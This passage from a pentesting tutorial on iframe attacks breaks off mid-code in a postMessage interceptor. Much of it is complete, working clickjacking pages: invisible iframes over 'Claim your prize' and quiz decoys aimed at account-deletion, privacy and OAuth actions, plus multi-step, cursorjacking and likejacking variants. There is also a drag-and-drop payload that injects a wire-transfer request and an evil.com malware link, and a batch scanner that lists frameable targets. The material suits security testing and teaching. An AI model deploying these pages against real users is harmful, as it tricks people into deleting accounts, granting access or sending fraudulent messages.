---
title: Iframe Manipulation
description: Iframe Manipulation attacks — Clickjacking, UI Redressing, Iframe Injection, Sandbox Bypass, postMessage exploitation, Framejacking, drag-and-drop hijacking, and advanced pentesting techniques.
navigation:
  icon: i-lucide-frame
  title: Iframe Manipulation
---

## What is Iframe Manipulation?

**Iframe Manipulation** is a broad category of client-side attacks that abuse the `<iframe>` HTML element to **overlay, embed, hijack, or intercept** user interactions across web applications. The core technique — **Clickjacking (UI Redressing)** — tricks users into clicking on hidden elements by layering a transparent iframe over a visible decoy page. Beyond clickjacking, iframe manipulation encompasses **postMessage hijacking**, **sandbox escapes**, **frame injection**, **drag-and-drop attacks**, **history manipulation**, and **cross-origin data leakage**.

::callout
---
icon: i-lucide-skull
color: red
---
Iframe manipulation attacks are **deceptively powerful** because the victim performs legitimate actions on a legitimate website — they just don't realize they're doing it. No malware, no exploit code running in the target's origin — the user's own authenticated session performs the attacker's desired action through **visual deception**.
::

::card-group
  ::card
  ---
  title: Clickjacking
  icon: i-lucide-mouse-pointer-click
  ---
  Overlaying a transparent target page over a visible decoy. The victim thinks they're clicking the decoy but actually interacts with the hidden target page.
  ::

  ::card
  ---
  title: postMessage Hijacking
  icon: i-lucide-mail
  ---
  Intercepting or spoofing cross-origin messages between iframes. Exploits missing origin validation in `window.postMessage()` handlers.
  ::

  ::card
  ---
  title: Frame Injection
  icon: i-lucide-square-plus
  ---
  Injecting malicious iframes into legitimate pages via XSS, HTML injection, or parameter manipulation to load phishing pages or exploit code.
  ::

  ::card
  ---
  title: Sandbox Escape
  icon: i-lucide-shield-off
  ---
  Bypassing iframe `sandbox` attribute restrictions to execute scripts, submit forms, or navigate the top-level window from a sandboxed context.
  ::
::

---

## How Clickjacking Works

::steps{level="4"}

#### Step 1 — Attacker Creates a Decoy Page

The attacker builds an enticing webpage with a visible button or interactive element that the victim will want to click (e.g., "Play Video", "Claim Prize", "Download").

#### Step 2 — Target Page Loaded in Transparent Iframe

The attacker embeds the **target application** (e.g., bank, social media, admin panel) in an invisible `<iframe>` positioned precisely over the decoy button.

#### Step 3 — Victim Clicks the Decoy

The victim sees the attacker's decoy page and clicks what appears to be an innocent button. In reality, their click passes through the transparent iframe to the **target page's button** underneath.

#### Step 4 — Authenticated Action Performed

Because the victim is logged into the target application, the click performs a **real action** — transferring money, changing settings, deleting an account, granting permissions — all without the victim's knowledge.

::

::note
The fundamental principle is that browsers allow **cross-origin iframes** by default. The attacker doesn't need to break same-origin policy — they simply **position** the target page under the victim's cursor and make it invisible.
::

---

## Clickjacking Architecture

### Visual Attack Anatomy

```text [clickjacking-anatomy.txt]
┌──────────────────────────────────────────────────────────────────┐
│                  CLICKJACKING ATTACK ANATOMY                     │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  WHAT THE VICTIM SEES:              WHAT ACTUALLY HAPPENS:       │
│  ┌─────────────────────┐           ┌─────────────────────┐      │
│  │  Attacker's Page    │           │  Target App (hidden) │      │
│  │                     │           │                      │      │
│  │                     │           │  ┌────────────────┐  │      │
│  │  ┌───────────────┐  │           │  │ Delete Account │  │      │
│  │  │  Play Video ▶ │  │ ── MAPS TO ─▶│    [Confirm]   │  │      │
│  │  └───────────────┘  │           │  └────────────────┘  │      │
│  │                     │           │                      │      │
│  │  "Click to watch    │           │  (opacity: 0.0)      │      │
│  │   this funny cat!"  │           │  (position: absolute)│      │
│  └─────────────────────┘           └─────────────────────┘      │
│                                                                  │
│  CSS TRICK:                                                      │
│  iframe {                                                        │
│    position: absolute;                                           │
│    top: 0; left: 0;                                              │
│    width: 500px;                                                 │
│    height: 500px;                                                │
│    opacity: 0.0;        /* Completely invisible */               │
│    z-index: 99999;      /* On top of everything */               │
│    pointer-events: auto; /* Captures clicks */                   │
│  }                                                               │
│                                                                  │
│  RESULT:                                                         │
│  Victim clicks "Play Video" → Actually clicks "Delete Account"  │
│  in the target app where they're authenticated.                  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Iframe Layering Techniques

::tabs
  :::tabs-item{icon="i-lucide-info" label="Opacity-Based"}
  ```text [opacity-technique.txt]
  OPACITY-BASED CLICKJACKING:
  ═══════════════════════════
  
  Layer Stack (bottom to top):
  ┌───────────────────────────────────┐
  │ z-index: 1 — Attacker's decoy    │  ← Victim sees THIS
  │ (visible, enticing content)       │
  ├───────────────────────────────────┤
  │ z-index: 99999 — Target iframe   │  ← Victim clicks THIS
  │ (opacity: 0, invisible)          │     (without knowing)
  └───────────────────────────────────┘
  
  CSS:
  #decoy { position: relative; z-index: 1; }
  #target-iframe { 
    position: absolute; 
    z-index: 99999;
    opacity: 0.0;           /* Fully transparent */
    /* or: opacity: 0.0001  — some browsers need non-zero */
  }
  
  Advantage: Simplest technique, works everywhere
  Weakness: Some security tools detect opacity: 0 on iframes
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Clip/Overflow-Based"}
  ```text [clip-technique.txt]
  CLIP/OVERFLOW-BASED CLICKJACKING:
  ═════════════════════════════════
  
  Instead of making the iframe invisible, show only a TINY PORTION
  of it (just the target button) and overlay it precisely.
  
  Technique 1: CSS clip-path
  ──────────────────────────
  iframe {
    clip-path: rect(340px, 200px, 380px, 50px);
    /* Only shows the exact area of the "Delete" button */
  }
  
  Technique 2: Overflow hidden container
  ──────────────────────────────────────
  <div style="width:200px; height:40px; overflow:hidden; position:relative;">
    <iframe src="https://target.com/settings" 
      style="position:absolute; top:-340px; left:-50px; 
             width:800px; height:600px; border:none;">
    </iframe>
  </div>
  
  Technique 3: Scrolling the iframe
  ─────────────────────────────────
  iframe {
    position: absolute;
    left: -50px;    /* Scroll horizontally */
    top: -340px;    /* Scroll vertically to target button */
    width: 800px;
    height: 600px;
  }
  /* Container clips it to show only the button area */
  
  Advantage: Harder to detect, no opacity manipulation
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Scaling/Transform"}
  ```text [scaling-technique.txt]
  SCALING/TRANSFORM-BASED CLICKJACKING:
  ═════════════════════════════════════
  
  Scale the target iframe to make only the target button
  fill the entire decoy area.
  
  Technique 1: CSS transform scale
  ─────────────────────────────────
  iframe {
    transform: scale(4.0);            /* 4x zoom */
    transform-origin: 120px 350px;    /* Origin on target button */
    opacity: 0.0001;
  }
  
  Technique 2: CSS zoom (non-standard)
  ────────────────────────────────────
  iframe {
    zoom: 3.0;
  }
  
  Technique 3: Negative margins
  ─────────────────────────────
  <div style="overflow:hidden; width:150px; height:40px;">
    <iframe src="https://target.com/settings" 
      style="margin-top:-340px; margin-left:-50px;
             width:800px; height:600px; 
             transform:scale(2); transform-origin:top left;">
    </iframe>
  </div>
  
  Advantage: Can make a small button fill a large clickable area
  Useful when: Target button is very small
  ```
  :::
::

---

## Header Analysis — Frameability Testing

Before attacking, determine if the target can be framed.

| Header | Value | Frameable? |
|--------|-------|:----------:|
| **None** | No frame protection headers | ✅ YES |
| `X-Frame-Options` | `DENY` | ❌ NO |
| `X-Frame-Options` | `SAMEORIGIN` | ⚠️ Only same origin |
| `X-Frame-Options` | `ALLOW-FROM https://trusted.com` | ⚠️ Only from specified origin (deprecated) |
| `Content-Security-Policy` | `frame-ancestors 'none'` | ❌ NO |
| `Content-Security-Policy` | `frame-ancestors 'self'` | ⚠️ Only same origin |
| `Content-Security-Policy` | `frame-ancestors https://trusted.com` | ⚠️ Only from specified origin |
| `Content-Security-Policy` | `frame-ancestors *` | ✅ YES |
| **Both** | `X-Frame-Options: DENY` + `CSP: frame-ancestors 'self'` | ❌ CSP takes precedence |

### Automated Frameability Testing

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="cURL Testing"}
  ```bash [frameability-test.sh]
  #!/bin/bash
  # Test if a target URL can be framed (clickjacked)

  TARGET="${1:-https://target.com}"

  echo "═══════���═══════════════════════════════"
  echo " Iframe Frameability Test"
  echo " Target: $TARGET"
  echo "═══════════════════════════════════════"

  # Fetch headers
  HEADERS=$(curl -sI -L "$TARGET" 2>/dev/null)

  echo -e "\n[1] X-Frame-Options Header:"
  XFO=$(echo "$HEADERS" | grep -i "^X-Frame-Options:" | tail -1)
  if [ -z "$XFO" ]; then
    echo "    [!] NOT SET — Potentially frameable!"
  else
    echo "    $XFO"
    if echo "$XFO" | grep -qi "DENY"; then
      echo "    [✗] DENY — Cannot be framed"
    elif echo "$XFO" | grep -qi "SAMEORIGIN"; then
      echo "    [⚠] SAMEORIGIN — Only same-origin framing"
    elif echo "$XFO" | grep -qi "ALLOW-FROM"; then
      echo "    [⚠] ALLOW-FROM — Restricted (deprecated header)"
    fi
  fi

  echo -e "\n[2] Content-Security-Policy frame-ancestors:"
  CSP=$(echo "$HEADERS" | grep -i "^Content-Security-Policy:" | tail -1)
  FA=$(echo "$CSP" | grep -oiP "frame-ancestors\s+[^;]+" )
  if [ -z "$FA" ]; then
    echo "    [!] frame-ancestors NOT SET"
  else
    echo "    $FA"
    if echo "$FA" | grep -qi "'none'"; then
      echo "    [✗] 'none' — Cannot be framed"
    elif echo "$FA" | grep -qi "'self'"; then
      echo "    [⚠] 'self' — Only same-origin"
    elif echo "$FA" | grep -qi "\*"; then
      echo "    [!] Wildcard — Can be framed from anywhere!"
    fi
  fi

  echo -e "\n[3] Quick Frameability PoC:"
  if [ -z "$XFO" ] && [ -z "$FA" ]; then
    echo "    [+] TARGET IS LIKELY FRAMEABLE!"
    echo "    [+] No X-Frame-Options or frame-ancestors detected"
    echo "    [+] Generate PoC with: clickjack-poc.html"
  else
    echo "    [-] Target has frame protection headers"
    echo "    [-] Check for bypasses (ALLOW-FROM deprecated, wildcard CSP)"
  fi

  echo -e "\n[4] Additional Headers:"
  echo "$HEADERS" | grep -iE "(Content-Security-Policy|Permissions-Policy|Cross-Origin)" | head -5

  echo -e "\n═══════════════════════════════════════"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Batch Scanner"}
  ```bash [batch-frameability-scanner.sh]
  #!/bin/bash
  # Batch scan multiple URLs for clickjacking vulnerability

  INPUT_FILE="${1:-urls.txt}"
  OUTPUT_FILE="frameable_targets.txt"

  echo "[*] Scanning URLs from: $INPUT_FILE"
  > "$OUTPUT_FILE"

  while IFS= read -r url; do
    [ -z "$url" ] && continue
    
    HEADERS=$(curl -sI -L --max-time 10 "$url" 2>/dev/null)
    XFO=$(echo "$HEADERS" | grep -i "^X-Frame-Options:" | head -1)
    CSP_FA=$(echo "$HEADERS" | grep -i "Content-Security-Policy:" | grep -oiP "frame-ancestors\s+[^;]+")
    
    if [ -z "$XFO" ] && [ -z "$CSP_FA" ]; then
      echo "[+] FRAMEABLE: $url"
      echo "$url" >> "$OUTPUT_FILE"
    elif echo "$XFO" | grep -qi "ALLOW-FROM"; then
      echo "[~] ALLOW-FROM (deprecated): $url"
      echo "$url # ALLOW-FROM bypass possible" >> "$OUTPUT_FILE"
    else
      echo "[-] Protected: $url"
    fi
  done < "$INPUT_FILE"

  TOTAL=$(wc -l < "$OUTPUT_FILE" 2>/dev/null || echo 0)
  echo -e "\n[*] Found $TOTAL frameable targets → $OUTPUT_FILE"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="JavaScript Detection"}
  ```javascript [frameability-js-test.js]
  // Client-side frameability test
  // Open browser console on target page and run this

  (function() {
    const results = {
      url: location.href,
      frameable: true,
      headers: {},
      frame_busting_js: false,
      sandbox_issues: false
    };

    // Check if page detects it's being framed
    try {
      if (window.self !== window.top) {
        console.log('[!] Page is currently in an iframe');
      } else {
        console.log('[*] Page is top-level (not framed)');
      }
    } catch(e) {
      console.log('[!] Cross-origin frame detection blocked');
    }

    // Check for frame-busting JavaScript
    const scripts = document.querySelectorAll('script');
    scripts.forEach(s => {
      const content = s.textContent || s.innerText;
      if (content.match(/top\s*[\.\[]\s*(location|document)|window\s*\.\s*top|self\s*!==?\s*top|parent\s*!==?\s*self|frameElement/i)) {
        results.frame_busting_js = true;
        console.log('[!] Frame-busting JavaScript detected:', 
          content.substring(0, 200));
      }
    });

    // Test actual frameability
    const testIframe = document.createElement('iframe');
    testIframe.style.display = 'none';
    testIframe.src = location.href;
    testIframe.onload = function() {
      try {
        const iframeDoc = testIframe.contentDocument;
        console.log('[+] Self-framing successful — page IS frameable');
      } catch(e) {
        console.log('[*] Cannot access iframe content (expected for cross-origin)');
        console.log('[*] But iframe loaded — meaning it CAN be framed');
      }
      testIframe.remove();
    };
    testIframe.onerror = function() {
      results.frameable = false;
      console.log('[-] Iframe loading failed — page may NOT be frameable');
      testIframe.remove();
    };
    document.body.appendChild(testIframe);

    console.log('\n=== Frameability Results ===');
    console.log(JSON.stringify(results, null, 2));
  })();
  ```
  :::
::

---

## Payloads & Techniques

### Basic Clickjacking PoC

::tabs
  :::tabs-item{icon="i-lucide-code" label="Classic Clickjack"}
  ```html [basic-clickjack.html]
  <!DOCTYPE html>
  <html>
  <head>
    <title>Win a Free iPhone!</title>
    <style>
      body {
        margin: 0;
        font-family: -apple-system, sans-serif;
        background: #f5f5f5;
      }

      /* Decoy content - what the victim sees */
      .decoy {
        position: relative;
        z-index: 1;
        text-align: center;
        padding: 100px 20px;
      }

      .decoy h1 {
        font-size: 36px;
        color: #333;
      }

      .decoy .btn {
        display: inline-block;
        padding: 20px 60px;
        background: #00c853;
        color: white;
        font-size: 24px;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        margin-top: 30px;
      }

      /* Invisible target iframe - captures the actual click */
      #target-frame {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99999;
        opacity: 0.0001;       /* Nearly invisible */
        border: none;
        pointer-events: auto;  /* Captures all mouse events */
      }

      /* Debug mode - set opacity to 0.3 to see the iframe */
      /* #target-frame { opacity: 0.3; } */
    </style>
  </head>
  <body>

    <!-- Decoy content -->
    <div class="decoy">
      <h1>🎉 Congratulations!</h1>
      <p>You've been selected to win a FREE iPhone 16 Pro!</p>
      <button class="btn">CLAIM YOUR PRIZE →</button>
      <p style="color:#999;margin-top:20px;">
        Click the button above to claim your reward
      </p>
    </div>

    <!-- Invisible iframe loading the target app -->
    <iframe id="target-frame" 
      src="https://target.com/settings/delete-account?confirm=true">
    </iframe>

  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Precise Button Overlay"}
  ```html [precise-overlay.html]
  <!DOCTYPE html>
  <html>
  <head>
    <title>Complete Survey</title>
    <style>
      body { margin: 0; font-family: sans-serif; }

      .container {
        position: relative;
        width: 500px;
        margin: 100px auto;
      }

      /* Decoy button positioned exactly over target button */
      .decoy-btn {
        position: absolute;
        top: 180px;      /* Adjust to match target button position */
        left: 120px;     /* Adjust to match target button position */
        width: 200px;
        height: 50px;
        z-index: 1;
        background: #4CAF50;
        color: white;
        font-size: 18px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      /* Target iframe - only the button area is clickable */
      .frame-container {
        position: absolute;
        top: 0;
        left: 0;
        width: 500px;
        height: 400px;
        overflow: hidden;
        z-index: 99999;
        opacity: 0.0001;
      }

      .frame-container iframe {
        position: absolute;
        top: -200px;     /* Scroll to target button */
        left: -100px;    /* Scroll to target button */
        width: 800px;
        height: 600px;
        border: none;
      }
    </style>
  </head>
  <body>

    <div class="container">
      <h2>Complete this quick survey</h2>
      <p>Answer one question and win $100!</p>
      
      <!-- Visible decoy button -->
      <div class="decoy-btn">Submit Answer ✓</div>

      <!-- Invisible iframe clipped to show only the target button -->
      <div class="frame-container">
        <iframe src="https://target.com/account/settings">
        </iframe>
      </div>
    </div>

  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Minimal PoC (Bug Bounty)"}
  ```html [minimal-poc.html]
  <!-- Minimal Clickjacking PoC for Bug Bounty Reports -->
  <!DOCTYPE html>
  <html>
  <head>
    <title>Clickjacking PoC — [Target Name]</title>
  </head>
  <body>
    <h1>Clickjacking Proof of Concept</h1>
    <p>Target: <code>https://target.com/sensitive-action</code></p>
    <p>The iframe below loads the target page, proving it can be framed:</p>
    
    <!-- Visible iframe to prove frameability -->
    <iframe 
      src="https://target.com/sensitive-action" 
      width="800" 
      height="600" 
      style="border:2px solid red;">
    </iframe>
    
    <p><strong>Impact:</strong> An attacker can overlay this iframe 
    (opacity: 0) on a decoy page, tricking authenticated users into 
    performing sensitive actions like [describe action].</p>
    
    <!-- 
    To demonstrate actual clickjacking:
    Add: style="opacity: 0; position: absolute; z-index: 99999;" 
    And create a decoy button underneath
    -->
  </body>
  </html>
  ```
  :::
::

### Multi-Step Clickjacking

For actions requiring multiple clicks (e.g., confirmation dialogs), the attacker chains multiple click positions.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Multi-Step PoC"}
  ```html [multi-step-clickjack.html]
  <!DOCTYPE html>
  <html>
  <head>
    <title>Fun Quiz Game!</title>
    <style>
      body { margin: 0; font-family: sans-serif; background: #1a1a2e; color: white; }
      
      .quiz-container {
        max-width: 600px;
        margin: 50px auto;
        text-align: center;
        position: relative;
      }

      .step { display: none; }
      .step.active { display: block; }

      .quiz-btn {
        padding: 15px 40px;
        font-size: 20px;
        background: #e94560;
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        margin: 10px;
      }

      /* Invisible iframe - repositioned for each step */
      #target-frame {
        position: absolute;
        z-index: 99999;
        opacity: 0.0001;
        border: none;
      }
    </style>
  </head>
  <body>

    <div class="quiz-container">
      <!-- Step 1: First click → targets "Delete Account" button -->
      <div class="step active" id="step1">
        <h1>🧠 Quiz Time!</h1>
        <p>Question 1: What is the capital of France?</p>
        <button class="quiz-btn" onclick="nextStep(2)">Paris ✓</button>
        <button class="quiz-btn">London</button>
      </div>

      <!-- Step 2: Second click → targets "Yes, I'm sure" confirmation -->
      <div class="step" id="step2">
        <h1>Correct! 🎉</h1>
        <p>Question 2: What is 2 + 2?</p>
        <button class="quiz-btn" onclick="nextStep(3)">4 ✓</button>
        <button class="quiz-btn">5</button>
      </div>

      <!-- Step 3: Third click → targets "Confirm deletion" final button -->
      <div class="step" id="step3">
        <h1>You're a genius! 🏆</h1>
        <p>Click below to claim your prize!</p>
        <button class="quiz-btn" onclick="nextStep(4)">CLAIM PRIZE 🎁</button>
      </div>

      <div class="step" id="step4">
        <h1>Processing your prize...</h1>
        <p>Please wait...</p>
      </div>

      <!-- Iframe repositioned for each step -->
      <iframe id="target-frame" 
        src="https://target.com/account/delete">
      </iframe>
    </div>

    <script>
      const iframe = document.getElementById('target-frame');
      
      // Position map: each step aligns iframe button with quiz button
      const positions = {
        1: { top: '220px', left: '100px', width: '500px', height: '400px',
             iframeTop: '-300px', iframeLeft: '-150px' },
        2: { top: '220px', left: '100px', width: '500px', height: '400px',
             iframeTop: '-380px', iframeLeft: '-150px' },
        3: { top: '220px', left: '130px', width: '500px', height: '400px',
             iframeTop: '-420px', iframeLeft: '-180px' }
      };

      function nextStep(step) {
        // Hide all steps, show current
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step' + step).classList.add('active');
        
        // Reposition iframe for next target button
        if (positions[step]) {
          const pos = positions[step];
          const container = document.createElement('div');
          container.style.cssText = `
            position: absolute;
            top: ${pos.top};
            left: ${pos.left};
            width: 200px;
            height: 50px;
            overflow: hidden;
            z-index: 99999;
            opacity: 0.0001;
          `;
          
          iframe.style.cssText = `
            position: absolute;
            top: ${pos.iframeTop};
            left: ${pos.iframeLeft};
            width: 800px;
            height: 600px;
            border: none;
          `;
        }
      }

      // Initialize first position
      nextStep(1);
    </script>

  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Multi-Step Scenarios"}
  ```text [multi-step-scenarios.txt]
  MULTI-STEP CLICKJACKING SCENARIOS:
  ══════════════════════════════════
  
  1. ACCOUNT DELETION (3 clicks)
     Click 1: "Delete Account" button
     Click 2: "Yes, I'm sure" confirmation  
     Click 3: "Permanently delete" final confirmation
  
  2. MONEY TRANSFER (4 clicks)
     Click 1: "Transfer Funds" menu item
     Click 2: Select recipient (pre-filled)
     Click 3: Confirm amount (pre-filled)
     Click 4: "Send Transfer" button
  
  3. ADMIN ROLE ASSIGNMENT (3 clicks)
     Click 1: "Users" menu → navigate to user list
     Click 2: "Edit" on attacker's user entry
     Click 3: "Make Admin" toggle + "Save"
  
  4. OAUTH AUTHORIZATION (2 clicks)
     Click 1: "Authorize" button on OAuth consent screen
     Click 2: "Allow all permissions" checkbox + confirm
  
  5. 2FA DISABLE (3 clicks)
     Click 1: "Security Settings" navigation
     Click 2: "Disable 2FA" button
     Click 3: "Confirm disable" in popup
  
  TECHNIQUE:
  Each step uses a different iframe position.
  The quiz/game provides natural multi-click interaction.
  Each "answer" click maps to a different target button.
  ```
  :::
::

### Drag-and-Drop Clickjacking

::tabs
  :::tabs-item{icon="i-lucide-code" label="Drag-and-Drop Attack"}
  ```html [drag-drop-clickjack.html]
  <!DOCTYPE html>
  <html>
  <head>
    <title>Drag and Drop Game</title>
    <style>
      body { 
        margin: 0; 
        font-family: sans-serif; 
        background: #f0f0f0;
        padding: 50px; 
      }

      .game-area {
        display: flex;
        gap: 50px;
        position: relative;
      }

      .drag-source {
        width: 200px;
        height: 200px;
        background: #4CAF50;
        color: white;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 10px;
        cursor: grab;
        font-size: 18px;
        user-select: none;
      }

      .drop-target-visible {
        width: 200px;
        height: 200px;
        border: 3px dashed #999;
        border-radius: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #999;
        font-size: 16px;
      }

      /* Hidden iframe positioned over drop zone */
      #hidden-target {
        position: absolute;
        top: 0;
        right: 0;
        width: 300px;
        height: 300px;
        opacity: 0.0001;
        z-index: 99999;
        border: none;
      }
    </style>
  </head>
  <body>

    <h1>🎮 Drag the Prize to Your Basket!</h1>
    <p>Drag the green box into the basket to win!</p>

    <div class="game-area">
      <!-- Draggable element with malicious data -->
      <div class="drag-source" 
           draggable="true" 
           id="drag-item"
           ondragstart="handleDrag(event)">
        🎁 FREE PRIZE
      </div>

      <!-- Visible drop zone (decoy) -->
      <div class="drop-target-visible"
           ondragover="event.preventDefault()"
           ondrop="handleDrop(event)">
        🧺 Drop Here!
      </div>

      <!-- Hidden iframe - actual drop target -->
      <!-- The target page has a text input or drop zone -->
      <iframe id="hidden-target" 
        src="https://target.com/compose-email">
      </iframe>
    </div>

    <script>
      function handleDrag(e) {
        // Set drag data — this gets dropped into the target's input field
        // Could be a malicious URL, script, or email content
        e.dataTransfer.setData('text/plain', 
          'Please wire $50,000 to account: ATTACKER-IBAN-12345');
        
        // Alternative: drop HTML content
        e.dataTransfer.setData('text/html', 
          '<a href="https://evil.com/malware">Click here for important update</a>');
      }

      function handleDrop(e) {
        e.preventDefault();
        // Decoy feedback
        e.target.innerHTML = '🎉 You won!';
        e.target.style.background = '#4CAF50';
        e.target.style.color = 'white';
      }
    </script>

  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Drag-Drop Attack Types"}
  ```text [drag-drop-types.txt]
  DRAG-AND-DROP ATTACK SCENARIOS:
  ═══════════════════════════════
  
  1. TEXT INJECTION
     ─────────────
     Drag data contains malicious text
     Dropped into target's input field (email compose, chat, etc.)
     Target sends attacker-crafted message/email
  
  2. LINK INJECTION
     ──────────────
     Drag data contains HTML with malicious link
     Dropped into rich text editor in target page
     Victim unknowingly publishes phishing link
  
  3. FILE EXFILTRATION (reverse drag)
     ─────────────────────────────────
     Victim drags content FROM the target iframe
     TO the attacker's visible page
     Attacker captures the dragged data
     Can extract: text selections, links, token values
  
  4. TOKEN/SECRET EXTRACTION
     ───────────────────────
     Target page displays CSRF token or API key
     Decoy asks user to "drag the text to verify"
     User drags visible text → actually drags token from iframe
     Attacker captures the token value
  
  5. ADDRESS BAR SPOOFING
     ────────────────────
     Drag a link to the address bar
     Combined with javascript: URI → code execution
     User thinks they're dragging a bookmark
  ```
  :::
::

### Cursor Manipulation (Cursorjacking)

::code-collapse

```html [cursorjacking.html]
<!DOCTYPE html>
<html>
<head>
  <title>Photo Gallery</title>
  <style>
    body { margin: 0; cursor: none; /* Hide real cursor */ }

    /* Fake cursor - offset from real position */
    #fake-cursor {
      position: fixed;
      width: 24px;
      height: 24px;
      pointer-events: none;
      z-index: 999999;
      /* Arrow cursor image */
      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3l14 9-8 2-3 8z" fill="%23000"/></svg>') no-repeat;
    }

    .gallery {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      padding: 50px;
    }

    .photo {
      width: 200px;
      height: 200px;
      background: #ddd;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 48px;
    }

    #target-frame {
      position: absolute;
      z-index: 99998;
      opacity: 0.0001;
      border: none;
    }
  </style>
</head>
<body>

  <!-- Fake cursor offset from real position -->
  <div id="fake-cursor"></div>

  <h1 style="padding: 20px;">📸 Photo Gallery - Click to Enlarge</h1>
  
  <div class="gallery">
    <div class="photo">🏔️</div>
    <div class="photo">🌊</div>
    <div class="photo">🌅</div>
    <div class="photo">🌺</div>
    <div class="photo">🏖️</div>
    <div class="photo">🌄</div>
  </div>

  <!-- Hidden iframe at real cursor position -->
  <iframe id="target-frame" 
    src="https://target.com/settings/privacy"
    width="300" height="200">
  </iframe>

  <script>
    const fakeCursor = document.getElementById('fake-cursor');
    const iframe = document.getElementById('target-frame');
    
    // Offset: fake cursor shown 200px to the right of real position
    const OFFSET_X = 200;
    const OFFSET_Y = 150;

    document.addEventListener('mousemove', function(e) {
      // Show fake cursor at offset position
      fakeCursor.style.left = (e.clientX + OFFSET_X) + 'px';
      fakeCursor.style.top = (e.clientY + OFFSET_Y) + 'px';
      
      // Position iframe where the REAL (hidden) cursor is
      // The user sees the fake cursor on a photo,
      // but their real click lands on the iframe
      iframe.style.left = (e.clientX - 100) + 'px';
      iframe.style.top = (e.clientY - 25) + 'px';
    });
  </script>

</body>
</html>
```

::

### Likejacking / Social Media Clickjacking

::tabs
  :::tabs-item{icon="i-lucide-code" label="Facebook Like Clickjack"}
  ```html [likejacking.html]
  <!DOCTYPE html>
  <html>
  <head>
    <title>Exclusive Video - Must Watch!</title>
    <style>
      body {
        margin: 0;
        font-family: sans-serif;
        background: #000;
        color: white;
        text-align: center;
        padding-top: 50px;
      }

      .video-container {
        position: relative;
        width: 640px;
        height: 360px;
        margin: 30px auto;
        background: #111;
        border-radius: 10px;
        overflow: hidden;
      }

      /* Fake video thumbnail */
      .video-thumb {
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #1a1a2e, #16213e);
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .play-btn {
        width: 80px;
        height: 80px;
        background: rgba(255,0,0,0.8);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 36px;
        cursor: pointer;
      }

      /* Hidden social media iframe over play button */
      .social-iframe {
        position: absolute;
        top: 140px;      /* Positioned over play button */
        left: 250px;
        width: 140px;
        height: 80px;
        overflow: hidden;
        z-index: 99999;
        opacity: 0.0001;
      }

      .social-iframe iframe {
        position: absolute;
        top: -200px;    /* Scroll to Like button */
        left: -50px;
        width: 400px;
        height: 400px;
        border: none;
      }
    </style>
  </head>
  <body>

    <h1>😱 You Won't Believe What Happened Next!</h1>

    <div class="video-container">
      <div class="video-thumb">
        <div class="play-btn">▶</div>
      </div>
      
      <!-- Hidden Like/Follow iframe -->
      <div class="social-iframe">
        <iframe src="https://social-media.com/plugins/like.php?href=https://attacker-page.com&action=like">
        </iframe>
      </div>
    </div>

    <p>Click play to watch the exclusive video</p>

  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Social Clickjacking Targets"}
  ```text [social-clickjacking-targets.txt]
  SOCIAL MEDIA CLICKJACKING TARGETS:
  ══════════════════════════════════
  
  LIKES / REACTIONS:
  ├── Facebook Like button → spam page promotion
  ├── Twitter/X Like button → engagement manipulation
  ├── Instagram Like → artificial engagement
  └── YouTube Like → video ranking manipulation
  
  FOLLOWS / SUBSCRIBES:
  ├── Twitter/X Follow → grow follower count
  ├── Instagram Follow → influencer fraud
  ├── YouTube Subscribe → channel promotion
  └── Twitch Follow → viewership inflation
  
  SHARES / RETWEETS:
  ├── Facebook Share → viral spam distribution
  ├── Twitter/X Retweet → amplify malicious content
  └── LinkedIn Share → professional network spam
  
  OAUTH AUTHORIZATION:
  ├── "Authorize App" button → grant attacker app access
  ├── "Allow Permissions" → data access to attacker
  └── "Connect Account" → account linking
  
  IMPACT:
  ├── Spam propagation at scale
  ├── Reputation manipulation
  ├── Advertising fraud
  ├── Malware distribution via social shares
  └── Data harvesting via OAuth authorization
  ```
  :::
::

---

## postMessage Exploitation

### postMessage Hijacking

::tabs
  :::tabs-item{icon="i-lucide-code" label="Message Interception"}
  ```html [postmessage-intercept.html]
  <!DOCTYPE html>
  <html>
  <head><title>postMessage Interceptor</title></head>
  <body>
  <h1>postMessage Interception PoC</h1>
  <div id="log"></div>

  <!-- Load target in iframe -->
  <iframe id="target" src="https://target.com/page-that-posts-messages" 
    width="800" height="400" style="border:1px solid #ccc;">
  </iframe>

  <script>
  // Listen for ALL postMessage events
  window.addEventListener('message', function(event) {
    const logDiv = document.getElementById('log');
    
    const entry = document.createElement('div');
    entry.style.cssText = 'border:1px solid #ddd; padding:10px; margin:5px; background:#f9f9f9;';
    entry.innerHTML = `
      <strong>Message Received!</strong><br>
      <strong>Origin:</strong> ${event.origin}<br>
      <strong>Data:</strong> <pre>${JSON.stringify(event.data, null, 2)}</pre>
      <strong>Source:</strong> ${event.source === window ? 'self' : 'iframe/opener'}<br>
      <strong>Time:</strong> ${new Date().toISOString()}
    `;
